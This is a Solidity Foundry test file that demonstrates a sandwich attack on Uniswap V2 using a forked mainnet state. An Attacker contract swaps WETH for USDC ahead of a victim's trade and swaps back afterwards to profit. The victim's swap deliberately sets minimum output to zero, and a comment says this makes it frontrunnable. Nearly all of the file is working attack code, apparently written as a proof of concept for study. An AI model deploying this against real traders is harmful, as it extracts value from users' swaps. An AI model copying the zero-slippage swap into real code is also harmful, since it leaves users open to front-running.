// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {IUniswapV2Router} from "test/interfaces/IUniswapV2Router.sol";

contract Attacker {

    IUniswapV2Router public Router2 = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IERC20 public USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // token0
    IERC20 public WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // token1

    constructor() {
        USDC.approve(address(Router2), type(uint256).max);
        WETH.approve(address(Router2), type(uint256).max);
    }

    function firstSwap(uint256 amount) external {
        address[] memory path = new address[](2);
        //Swap from WETH to USDC
        path[0] = address(WETH);
        path[1] = address(USDC);

        Router2.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp + 4200);
    }

    function secondSwap() external {
        address[] memory path = new address[](2);
        //Swap from USDC to WETH
        path[0] = address(USDC);
        path[1] = address(WETH);

        uint256 amount = USDC.balanceOf(address(this));

        Router2.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp + 4200);
    }

    function getUSDCBalance(address user) external view returns (uint256 result) {
        return USDC.balanceOf(user);
    }

    function getWETHBalance(address user) external view returns (uint256 result) {
        return WETH.balanceOf(user);
    }

}

contract Sandwich is Test {

    Attacker public attacker;
    address public victim;

    uint256 mainnetfork;

    IUniswapV2Router public Router2 = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IERC20 public USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // token0
    IERC20 public WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // token1

    function setUp() public {
        mainnetfork = vm.createSelectFork("mainnet", 17_626_926);

        victim = vm.addr(1);

        attacker = new Attacker();

        deal(address(WETH), victim, 1000 * 1e18); // victim initial balance
        deal(address(WETH), address(attacker), 1000 * 1e18); // attacker initial balance
    }

    function _frontrun() internal {
        attacker.firstSwap(WETH.balanceOf(address(attacker)));
    }

    function _victim() internal {
        vm.startPrank(victim);
        WETH.approve(address(Router2), type(uint256).max);

        address[] memory path = new address[](2);
        //Swap from WETH to USDC
        path[0] = address(WETH);
        path[1] = address(USDC);

        Router2.swapExactTokensForTokens(WETH.balanceOf(victim), 0, path, victim, block.timestamp + 4200); // the second
        // parameter set to 0, to make it frontrunnable

        vm.stopPrank();
    }

    function _backun() internal {
        attacker.secondSwap();
    }

    function testSandwich() public {
        console.log("USDC Balance before (attacker)  = ", attacker.getUSDCBalance(address(attacker)));
        console.log("WETH Balance before (attacker) = ", attacker.getWETHBalance(address(attacker)));
        console.log("USDC Balance before (victim)  = ", attacker.getUSDCBalance(victim));
        console.log("WETH Balance before (victim) = ", attacker.getWETHBalance(victim));
        _frontrun();
        _victim();
        _backun();
        console.log("USDC Balance after (attacker)  = ", attacker.getUSDCBalance(address(attacker)));
        console.log("WETH Balance after (attacker) = ", attacker.getWETHBalance(address(attacker)));
        console.log("USDC Balance after (victim)  = ", attacker.getUSDCBalance(victim));
        console.log("WETH Balance after (victim) = ", attacker.getWETHBalance(victim));
    }

}
